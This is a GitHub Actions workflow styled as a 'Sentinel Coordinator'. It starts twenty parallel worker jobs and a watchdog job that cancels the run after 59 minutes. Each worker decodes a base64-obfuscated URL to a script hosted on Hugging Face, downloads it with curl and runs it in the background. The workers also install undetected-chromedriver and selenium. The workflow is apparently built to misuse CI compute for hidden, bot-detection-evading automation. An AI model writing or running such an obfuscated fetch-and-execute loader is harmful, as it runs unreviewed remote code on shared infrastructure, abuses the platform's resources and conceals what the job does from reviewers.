name: Horizon Sentinel Coordinator

on:
  workflow_dispatch:

concurrency:
  group: horizon-engine-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Task 1: Auto-Termination Watchdog (Triggered at 59 mins)
  # =================================================================
  watchdog-monitor:
    name: "Watchdog Engine"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      MAX_WATCH_TIME: 3540
    steps:
      - name: Initialize Watchdog Tracking
        run: |
          echo "[MONITOR] Watchdog initiated for execution ID: ${{ github.run_id }}"
          echo "[MONITOR] Entering holding state for ${MAX_WATCH_TIME} seconds."

          sleep "${MAX_WATCH_TIME}"

          echo "[MONITOR] Max duration reached - executing pipeline cancellation request."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[MONITOR] Pipeline cancellation issued successfully."

  # =================================================================
  # Task 2: Parallel Grid Operations
  # =================================================================
  grid-operations:
    name: "GridWorker-${{ matrix.node_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_code: [m-1, m-2, m-3, m-4, m-5, m-6, m-7, m-8, m-9, 9910, 9911, 9912, 9913, 9914, 9915, 9916, 9917, 9918, 9919, 9920]

    steps:
      # Step 1: System Dependencies setup
      - name: Setup System Environment
        run: |
          echo "--> Setting up environment for GridWorker-${{ matrix.node_code }}..."
          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip

      # Step 2: Fetch background payload script
      - name: Fetch Core Service Payload
        run: |
          echo "--> Fetching service payload script..."
          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
          curl -sL "$REMOTE_SRC" -o core_service.py
          echo "--> Payload script successfully retrieved."

      # Step 3: Install required Python dependencies
      - name: Resolve Python Dependencies
        run: |
          echo "--> Installing necessary Python libraries..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # Step 4: Execute background payload with 59-minute lifetime limit
      - name: Execute Service Payload
        run: |
          echo "--> Starting worker process for GridWorker-${{ matrix.node_code }}..."

          python3 core_service.py &
          TASK_PID=$!

          echo "--> Process running (PID: $TASK_PID). Upper time limit set to 3540s."

          sleep 3540

          if kill -0 "$TASK_PID" 2>/dev/null; then
            echo "--> Time limit reached. Force killing worker process (PID: $TASK_PID)..."
            kill -9 "$TASK_PID"
            echo "--> Worker process stopped by runtime manager."
          else
            echo "--> Worker process finished execution naturally before limit."
          fi
